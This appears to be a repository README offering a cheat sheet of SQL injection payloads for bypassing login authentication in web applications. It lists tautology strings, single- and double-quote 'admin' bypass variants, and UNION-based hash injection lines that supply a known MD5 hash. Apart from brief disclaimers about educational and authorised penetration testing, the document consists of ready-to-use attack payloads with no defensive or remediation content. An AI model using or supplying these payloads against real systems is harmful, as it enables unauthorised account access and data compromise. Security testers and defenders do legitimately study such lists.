# Admin Authentication Bypass Cheat Sheet

## Description
This cheat sheet contains a collection of SQL injection payloads that can be used to bypass authentication mechanisms in vulnerable web applications. These payloads exploit common SQL injection vulnerabilities in login forms to gain unauthorized access. Use this list for educational and security testing purposes only.

## Disclaimer
**This repository is for educational and ethical penetration testing purposes only. Unauthorized use of these techniques on systems you do not own is illegal.**

## Authentication Bypass Payloads

### Basic SQL Injection Payloads
```
or 1=1
or 1=1--
or 1=1#
or 1=1/*
or 1=1 -- -
```

### Admin Login Bypass Payloads
```
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
```

### Hash Injection Payloads
```
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
```

### Double Quote Payloads
```
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
```

### Alternative Hash Injection Payloads
```
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

## Usage
- Use these payloads in security testing environments only.
- Never attempt to exploit real-world applications without permission.
- Always follow ethical hacking guidelines and responsible disclosure practices.


